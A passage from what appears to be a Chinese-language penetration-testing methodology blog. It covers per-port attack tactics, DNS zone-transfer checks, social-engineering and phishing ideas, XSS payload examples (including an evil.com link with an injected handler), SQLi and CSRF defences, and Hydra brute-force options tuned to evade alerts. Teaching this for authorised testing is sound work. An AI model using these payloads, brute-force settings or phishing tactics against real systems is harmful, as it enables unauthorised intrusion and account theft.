<td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
</tr>
<tr>
<td>tcp 22</td>
<td>ssh[数据ssl加密传输]</td>
<td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…</td>
</tr>
<tr>
<td>tcp 23</td>
<td>telnet[明文传输]</td>
<td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获</td>
</tr>
<tr>
<td>tcp 25</td>
<td>smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]</td>
<td>邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
</tr>
<tr>
<td>tcp/udp 53</td>
<td>dns[域名解析]</td>
<td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
</tr>
<tr>
<td>tcp/udp 69</td>
<td>tftp[简单文件传输协议,无认证]</td>
<td>尝试下载目标及其的各类重要配置文件</td>
</tr>
<tr>
<td>tcp 80-89,443,8440-8450,8080-8089</td>
<td>web[各种常用的web服务端口]</td>
<td>各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……</td>
</tr>
<tr>
<td>tcp 110</td>
<td>[邮局协议,可明文可密文]</td>
<td>可尝试爆破,嗅探</td>
</tr>
<tr>
<td>tcp 137,139,445</td>
<td>samba[smb实现windows和linux间文件共享,明文]</td>
<td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
</tr>
<tr>
<td>tcp 143</td>
<td>imap[可明文可密文]</td>
<td>可尝试爆破</td>
</tr>
<tr>
<td>udp 161</td>
<td>snmp[明文]</td>
<td>爆破默认团队字符串,搜集目标内网信息</td>
</tr>
<tr>
<td>tcp 389</td>
<td>ldap[轻量级目录访问协议]</td>
<td>ldap注入,允许匿名访问,弱口令</td>
</tr>
<tr>
<td>tcp 512,513,514</td>
<td>linux rexec</td>
<td>可爆破,rlogin登陆</td>
</tr>
<tr>
<td>tcp 873</td>
<td>rsync备份服务</td>
<td>匿名访问,文件上传</td>
</tr>
<tr>
<td>tcp 1194</td>
<td>openvpn</td>
<td>想办法钓vpn账号,进内网</td>
</tr>
<tr>
<td>tcp 1352</td>
<td>Lotus domino邮件服务</td>
<td>弱口令,信息泄漏,爆破</td>
</tr>
<tr>
<td>tcp 1433</td>
<td>mssql数据库</td>
<td>注入,提权,sa弱口令,爆破</td>
</tr>
<tr>
<td>tcp 1521</td>
<td>oracle数据库</td>
<td>tns爆破,注入,弹shell…</td>
</tr>
<tr>
<td>tcp 1500</td>
<td>ispmanager主机控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 1025,111,2049</td>
<td>nfs</td>
<td>权限配置不当</td>
</tr>
<tr>
<td>tcp 1723</td>
<td>pptp</td>
<td>爆破,想办法钓vpn账号,进内网</td>
</tr>
<tr>
<td>tcp 2082,2083</td>
<td>cpanel主机管理面板登录</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 2181</td>
<td>zookeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>tcp 2601,2604</td>
<td>zebra路由</td>
<td>默认密码zerbra</td>
</tr>
<tr>
<td>tcp 3128</td>
<td>squid代理服务</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 3312,3311</td>
<td>kangle主机管理登录</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 3306</td>
<td>mysql数据库</td>
<td>注入,提权,爆破</td>
</tr>
<tr>
<td>tcp 3389</td>
<td>windows rdp远程桌面</td>
<td>shift后门[需要03以下的系统],爆破,ms12-020[蓝屏exp]</td>
</tr>
<tr>
<td>tcp 4848</td>
<td>glassfish控制台</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 4899</td>
<td>radmin远程桌面管理工具,现在已经非常非常少了</td>
<td>抓密码拓展机器</td>
</tr>
<tr>
<td>tcp 5000</td>
<td>sybase/DB2数据库</td>
<td>爆破,注入</td>
</tr>
<tr>
<td>tcp 5432</td>
<td>postgresql数据库</td>
<td>爆破,注入,弱口令</td>
</tr>
<tr>
<td>tcp 5632</td>
<td>pcanywhere远程桌面管理工具</td>
<td>抓密码,代码执行,已经快退出历史舞台了</td>
</tr>
<tr>
<td>tcp 5900,5901,5902</td>
<td>vnc远程桌面管理工具</td>
<td>弱口令爆破,如果信息搜集不到位,成功几率很小</td>
</tr>
<tr>
<td>tcp 5984</td>
<td>CouchDB</td>
<td>未授权导致的任意指令执行</td>
</tr>
<tr>
<td>tcp 6379</td>
<td>redis未授权</td>
<td>可尝试未授权访问,弱口令爆破</td>
</tr>
<tr>
<td>tcp 7001,7002</td>
<td>weblogic控制台</td>
<td>java反序列化,弱口令</td>
</tr>
<tr>
<td>tcp 7778</td>
<td>kloxo</td>
<td>主机面板登录</td>
</tr>
<tr>
<td>tcp 8000</td>
<td>Ajenti主机控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 8443</td>
<td>plesk主机控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 8069</td>
<td>zabbix</td>
<td>远程执行,sql注入</td>
</tr>
<tr>
<td>tcp 8080-8089</td>
<td>Jenkins,jboss</td>
<td>反序列化,控制台弱口令</td>
</tr>
<tr>
<td>tcp 9080-9081,9090</td>
<td>websphere控制台</td>
<td>java反序列化/弱口令</td>
</tr>
<tr>
<td>tcp 9200,9300</td>
<td>elasticsearch</td>
<td>远程执行</td>
</tr>
<tr>
<td>tcp 10000</td>
<td>webmin linux主机web控制面板入口</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 11211</td>
<td>memcached</td>
<td>未授权访问</td>
</tr>
<tr>
<td>tcp 27017,27018</td>
<td>mongodb</td>
<td>爆破,未授权访问</td>
</tr>
<tr>
<td>tcp 3690</td>
<td>svn服务</td>
<td>svn泄露,未授权访问</td>
</tr>
<tr>
<td>tcp 50000</td>
<td>SAP Management Console</td>
<td>远程执行</td>
</tr>
<tr>
<td>tcp 50070,50030</td>
<td>hadoop</td>
<td>默认端口未授权访问</td>
</tr>
</tbody>
</table>
<ul>
<li><p>子域名信息收集</p>
<p>  在渗透测试的时候，往往主站的防御会很强，常常无从下手，那么子站就是一个重要的突破口，因为一个企业可能对子域名的安全不是很重视，甚至有些子域名只是内测阶段还没有上线，因此子域名是渗透测试的主要关注对象，子域名搜集的越完整，那么挖到的漏洞就可能更多，甚至漏洞的级别也会更高。常用工具暴力枚举<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a>、子域名挖掘机Layer、DNS域传送漏洞、https证书日志、DNS解析记录、搜索引擎（baidu/google）、IP反查、主站爬取、shodan/fofa/zoomeye等</p>
<p>  <strong>利用dig检查目标ns服务器是否允许传送</strong></p>
<p>  区域传送：允许第三主服务器的数据刷新自己的区域数据库，防止主域名服务器因意外故障变得不可用时影响到这个网络。 区域传送配置错误：只要有人发出请求，就会提供一个区域数据库的拷贝，把内部主机名和ip地址暴露出来</p>
<p>  首先,应该去查下目标的ns服务器是否允许区域传送,如果允许,直接把目标的整个子域备份过来即可，可以使用 <strong>dig</strong>（可以从该域名的官方DNS服务器上查询到精确的权威解答）或 <strong>nslookup</strong>（得到DNS解析服务器保存在Cache中的非权威解答）</p>
<ul>
<li><p>查出目标自己所有的ns记录,然后挨个尝试目标ns服务器是否允许传送（务必是目标自己的ns服务器,第三方的不算）</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="selector-tag">dig</span> +<span class="selector-tag">short</span> @<span class="keyword">8</span>.<span class="keyword">8</span>.<span class="keyword">8</span>.<span class="keyword">8</span> xx.cn ns</span><br><span class="line">dns.xx.cn.</span><br><span class="line">dns1.xx.cn.</span><br></pre></td></tr></table></figure>
<p>通过上面的查询,我们确定了目标自己的三个ns服务器,下面就开始来尝试逐个传送,这里还是要注意,必须用目标自己的ns服务器来解析它自己的子域</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># <span class="selector-tag">dig</span> @<span class="keyword">dns</span>.<span class="keyword">xx</span>.<span class="keyword">cn</span> xx.cn axfr</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; <span class="selector-tag">DiG</span> 9<span class="selector-class">.11</span><span class="selector-class">.3-1ubuntu1</span><span class="selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; @<span class="keyword">dns</span>.<span class="keyword">xx</span>.<span class="keyword">cn</span> xx.cn axfr</span><br><span class="line">; (1 <span class="selector-tag">server</span> <span class="selector-tag">found</span>)</span><br><span class="line">;; <span class="selector-tag">global</span> <span class="selector-tag">options</span>: +<span class="selector-tag">cmd</span></span><br><span class="line">; <span class="selector-tag">Transfer</span> <span class="selector-tag">failed</span>.</span><br><span class="line"></span><br><span class="line"># <span class="selector-tag">dig</span> @<span class="keyword">dns1</span>.<span class="keyword">xx</span>.<span class="keyword">cn</span> xx.cn axfr</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; <span class="selector-tag">DiG</span> 9<span class="selector-class">.11</span><span class="selector-class">.3-1ubuntu1</span><span class="selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; @<span class="keyword">dns1</span>.<span class="keyword">xx</span>.<span class="keyword">cn</span> xx.cn axfr</span><br><span class="line">; (1 <span class="selector-tag">server</span> <span class="selector-tag">found</span>)</span><br><span class="line">;; <span class="selector-tag">global</span> <span class="selector-tag">options</span>: +<span class="selector-tag">cmd</span></span><br><span class="line">; <span class="selector-tag">Transfer</span> <span class="selector-tag">failed</span>.</span><br></pre></td></tr></table></figure>
<p>很显然,上面的这些ns服务器都不允许传送,如果目标ns服务器实在不允许传送,从其他的各种记录中获取子域,如,mx记录,spf记录,srv记录…</p>
</li>
</ul>
</li>
<li><p>邮件系统信息</p>
<p>  通过域名MX记录查看是否为自建邮件服务器，自建的情况下可以后续测试漏洞，通过TheHarvester可以进行邮箱挖掘，没有找到漏洞也可以进行钓鱼</p>
</li>
<li><p>了解网站业务功能</p>
<p>  我们需要对整个站点的整体功能有所了解，从注册用户到更改信息更改密码等等，所有的功能都需要尽可能体验一遍，在体验的同时就应该思考这个功能可能产生什么样的漏洞，比如：登陆/留言/下单/退出/退货/付款等。并且需要多注册几个账号，这对后面的csrf漏洞发现或者逻辑漏洞发现等等都很有帮助</p>
</li>
<li><p>了解网站目录的结构</p>
<p>  在开始安全测试之前, 了解应用程序的结构是至关重要的。如果不彻底了解应用程序的布局, 就不可能对其进行彻底的测试。可以通过burpsuite自动化爬虫，</p>
</li>
<li><p>企业及员工信息收集-社会工程学</p>
<p>  通过天眼查、官方网站等可以查到企业的一些基本信息</p>
<p>  拿着姓名/手机/邮箱等到各网站搜一圈看注册信息</p>
<p>  拿到员工的信息，我们可以尝试使用弱密码进行登录一些内部平台，并且一些员工的邮箱的前缀很可能就是他的密码。当然，如果说当一个服务不允许多次使用错误密码登录，我们可以先确定弱口令，然后爆破收集到的账号信息去爆破哪些用户使用这个弱口令从而绕过这个防护机制。</p>
<p>  可以尝试给对方邮箱发送钓鱼邮件或木马</p>
<p>  UitraISO+Hacksaw制作木马启动盘</p>
<p>  Airmom-ng假冒ap，并利用karma架设假冒服务</p>
<p>  水坑攻击或鱼叉式钓鱼</p>
</li>
<li><p>网站备案信息</p>
<p>  <a href="http://www.beianbeian.com/?jdfwkey=vv0kk" target="_blank" rel="noopener">www.beianbeian.com/?jdfwkey=vv0kk</a></p>
<p>  <a href="http://www.miitbeian.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">http://www.miitbeian.gov.cn/publish/query/indexFirst.action</a></p>
</li>
<li><p>F12审查网页元素</p>
<p>  对于程序员来说, 在源代码中添加详细注释和元数据是非常普遍的,甚至是推荐的。但是, HTML 代码中包含的注释和元数据可能会对潜在攻击者暴露内部信息。应对源代码中的注释和元数据进行审查以确定是否泄露了任何信息。</p>
</li>
</ul>
<p>根据已搜集的信息进行梳理与分析，查找疏漏点进行搜集补充，从各个角度都整理一套渗透攻击步骤与思路的规划，优先以最擅长和最有把握的方面切入</p>
<h2 id="0x03-漏洞发现"><a href="#0x03-漏洞发现" class="headerlink" title="0x03 漏洞发现"></a>0x03 漏洞发现</h2><ul>
<li><p>漏洞扫描</p>
<p>  关于漏洞扫描的工具太多了，一般使用awvs/newwus扫描，其他辅助工具 Nmap、msf、searchsploit(exlpoitdb)、burp、firefox插件等</p>
<p>  但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞，需要靠平时的积累学习，且扫描器扫描会插入很多脏数据（数据库/日志等）对网站数据和服务造成破坏。</p>
<p>  拿到环境和不同权限的测试账号后，和业务方沟通业务逻辑，先熟悉一下网站的基本功能和结构，注册/登陆/各个功能模块，从系统漏洞/中间件漏洞/web漏洞</p>
</li>
</ul>
<ul>
<li><p>sql注入</p>
<p>  <strong>定义</strong>：Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，黑客可以利用该漏洞执行任意SQL语句。<br><br>  掌握常用的sql注入手法，熟练使用sqlmap或者同类工具。还需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。<br><br>  <strong>其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</strong>，还需要注意的是如后端语句使用了<code>insert</code>可能一个简单的逻辑判断都能把整个表给篡改了，要注意备份<br><br>  <strong>何防止SQL注入：</strong><br></p>
<ul>
<li>不信任用户的输入；</li>
<li>不使用动态拼接sql，可使用参数化的sql或直接使用存储过程进行数据查询存取；</li>
<li>不使用管理员权限的数据库连接；</li>
<li>对机密信息进行加密或hash掉密码和敏感信息；</li>
<li>应用异常尽可能少在web提示，最好使用自定义信息对应用的异常信息进行包装；</li>
<li><p>采用工具或网络平台检测是否存在SQL注入。</p>
<p><strong>从数据库读取数据</strong></p>
</li>
</ul>
</li>
<li><p>xss漏洞</p>
<p>  <strong>定义</strong>：恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br><br>  前端漏洞也是一个很大的板块，在做渗透测试的时候我们需要抓住一些细微的点，对每一个输出点都尽可能的测试，并且想方设法的去绕过<br></p>
<p>  <strong>用户输入被返回到前端页面</strong></p>
<p>  <strong>XSS可能发生的场景</strong></p>
<ol>
<li><p>在HTML标签中输出</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--在这种场景下，XSS的利用方式一般是构造一个&lt;script&gt;标签，或者是任何能够产生脚本执行的方式。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在HTML属性中输出</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"abc"</span> <span class="attr">name</span>=<span class="string">"$var"</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--灵活构造XSS PAYLOAD--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"abc"</span> <span class="attr">name</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">""</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>&lt;script&gt;</code>标签中输出 </p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x = <span class="string">"$var"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--攻击者需要先闭合引号才能实施XSS攻击--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">""</span>;alert(<span class="regexp">/xss/</span>);<span class="comment">//";</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在事件中输出</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('$var')"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--可能的攻击方法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('');alert(/xss/);  //')"</span>     &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在CSS中输出</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>($&#123;xss&#125;);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>($&#123;xss&#125;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">在<span class="selector-tag">CSS</span>中输出同样存在<span class="selector-tag">XSS</span>的风险，如：</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>(alert(/xss/));&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在地址中输出<br> 6.1 在URL的path（路径）或者search（参数）中输出</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test=$var"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test="</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>"" &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 防御方法：使用URLEncode</p>
<p> 6.2 整个URL能够被用户控制<br> 这时URL的Protocol和Host部分是不能够使用URLEncode的</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$var"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 攻击方法：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1);"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 防御方法：检查变量是否以”http”开头，再对变量进行URLEncode，OWASP中有函数ESAPI.encoder().encoderForURL()，但此API未解决伪协议的问题。</p>
<p><strong>如何防止XSS跨站脚本攻击：（原则是不相信用户输入的数据）</strong><br></p>
</li>
</ol>
<ul>
<li>将重要的cookies标记为http only，这样JavaScript中的document.cookie语句就不能获取到cookie了；</li>
<li>只允许用户输入我们期望的数据，如年龄的textbox中只允许输入数字，其余过滤；</li>
<li>对数据进行Html Encode处理，如&lt;转化为&amp;lt；、&amp;转化为&amp;amp；</li>
<li>过滤或移除特殊的Html标签，如：script、iframe；</li>
<li>过滤JavaScript事件的标签，如“onclick=”、“onfocus”等等。</li>
</ul>
</li>
<li><p>上传漏洞</p>
<p>  各种web中间件解析漏洞，各类编辑器漏洞利用，bypass上传检测（黑名单、白名单配合解析漏洞、阶段、.htaccess自解析、配合本地包含漏洞一起利用</p>
<p>  更多<a href="http://www.pa55w0rd.club/2018/10/19/fileupload/">《文件上传漏洞总结》</a></p>
</li>
<li><p>xxe漏洞</p>
<p>  xxe漏洞如果存在的话危害是非常大的，从读取信息到探测内网等等</p>
</li>
<li><p>逻辑漏洞</p>
<p>  逻辑漏洞包括任意重置用户密码，修改订单等等，这类漏洞是扫描器所不能扫描出来的，所以需要我们认真分析整个站点的功能，分析其逻辑，多用burpsuite抓包观察数据包是否可篡改，验证码是否可爆破等等</p>
</li>
<li><p>csrf</p>
<p>  <strong>定义</strong>：是指攻击者通过伪装来自受信任用户的请求来利用受信任的站点，强制对已完成认证的用户进行非预期的个人信息或设定信息等某种状态更新，也就是说攻击者盗用了你的身份，以你的名义发送恶意请求。<br><br>  攻击者迫使web应用的用户去执行攻击者预设的操作，如果服务器没有合适的防御措施，用户即使访问熟悉的可信网站（生成的poc可以隐藏到论坛/blog等用户生成内容的网站中）也有受到攻击的危险</p>
<p>  攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
<p>  因此对于用户来说很难避免在登陆一个网站之后不点击一些链接进行其他操作，所以随时可能成为CSRF的受害者。</p>
<p>  检测csrf漏洞一般是看每一个操作是否有验证码验证，是否有token或者referer,可以注册多个账户然后利用A用户生成的poc去检测B用户，poc可以通过burpsuite去生成<br></p>
<p>  <strong>功能使用的是请求/响应模式</strong></p>
<p>  如何防止CSRF跨站请求攻击：<br></p>
<ul>
<li>在web站点，将持久化的授权（例如cookie或者http授权）切换为瞬时的授权方法（在每个form中提供隐藏field）；</li>
<li>验证码，强化用户与应用的交互，但每个请求都加验证码，用户友好性体验差，不适合实际使用；</li>
<li>在HTTP头中自定义属性并验证 + One time tokens；</li>
<li>检查请求header中的referer也能帮助组织CSRF攻击，但服务器不是总能拿到referer，有些浏览器出于安全会隐私考虑会不发referer，所以也不常用； </li>
<li>在浏览其它站点前退出登录站点或者浏览结束后清理浏览器cookies；</li>
<li><p>不同的表单包含一个随机的token，在用户提交数据的同时提交这个token，服务器端对比后如果不正确，则拒绝执行操作。<br>  这里是对token的建议如果是已登录的界面给予建议：在前端生成含有 <strong>用户id|当前时间|当前用户ip</strong>可逆的组合加密项(注意是加密不是编码，切忌不要用base64等常见编码当加密措施)，然后后端接收到token然后解密并验证用户ID是否与当前cookie中的用户id一致、用户当前IP是否一致、用户提交的时间与当前时间间隔，如果差距在30分钟以上那么需要用户重新刷新表单提交。</p>
<p>  首先当用户第一次访问页面的时候，服务端可以获取到用户的ID、用户的当前IP、当前用户访问的时间等一些相关信息，利用这些信息组合做一个可逆向的加密，返回给前端，在前端生成一个input  hidden项 name为token，直接放入 value，如果用户执行页面的一些操作Get、Post等请求，会自动带上此值，然后服务端解密此值，然后在与当前获取的同样的数据做判断。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>未授权访问</p>
<p>  这里所指的未授权包括各种空密码之类的，这种漏洞危害是不言而喻的</p>
</li>
<li><p>弱口令</p>
<p>  可以通过爆破的方式发现弱口令，web可以使用burpsuite，服务可以使用hydra</p>
<p>  <strong>hydra简单使用</strong></p>
<p>  项目地址：<a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">https://github.com/vanhauser-thc/thc-hydra</a></p>
<p>  hydra可以运行在Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS</p>
<p>  支持的协议包括：Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p>
  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破</span></span><br><span class="line"><span class="ruby">-S 	爆破https时需要加上该选项</span></span><br><span class="line"><span class="ruby">-s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号</span></span><br><span class="line"><span class="ruby">-l/-L 	指定用户名 / 指定用户名字典文件</span></span><br><span class="line"><span class="ruby">-p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]</span></span><br><span class="line"><span class="ruby">-e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]</span></span><br><span class="line"><span class="ruby">-f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个<span class="string">'进程'</span>退出,-F表示全局退出</span></span><br><span class="line"><span class="ruby">-t 	指定爆破进程,实际爆破中给<span class="number">8</span>个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能    无限大,基于目标系统而定,大家酌情使用吧</span></span><br><span class="line"><span class="ruby">-w 	设定超时时长,默认<span class="number">32</span>秒,一般情况<span class="number">10</span>秒即可</span></span><br><span class="line"><span class="ruby">-<span class="number">4</span>/-<span class="number">6</span> 	<span class="number">4</span>表示用ipv4,<span class="number">6</span>表示用ipv6</span></span><br><span class="line"><span class="ruby">-v 	显示爆破信息</span></span><br><span class="line"><span class="ruby">-M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式</span></span><br></pre></td></tr></table></figure>
<p>  针对各类服务的实例爆破演示</p>
